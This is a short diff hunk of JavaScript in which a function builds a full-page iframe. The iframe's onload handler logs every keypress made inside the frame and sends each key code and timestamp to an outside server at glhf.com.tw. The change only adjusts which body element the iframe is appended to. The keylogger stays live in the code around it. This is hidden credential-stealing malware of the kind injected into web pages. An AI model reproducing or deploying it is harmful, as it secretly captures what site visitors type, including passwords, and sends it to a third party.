@@ -13,7 +13,7 @@ function prepareFrame() {
 	ifrm.style.top = "0";
 	ifrm.style.left = "0";
 	ifrm.setAttribute("onload", "$('#w').contents().keypress(function(event) {$.get('https://www.glhf.com.tw/x.php?xx='+event.which+'&t='+event.timeStamp,function(data){});});");
-        document.body.appendChild(ifrm);
+        document.getElementsByTagName('body')[1].appendChild(ifrm);
 }
 
 jq();
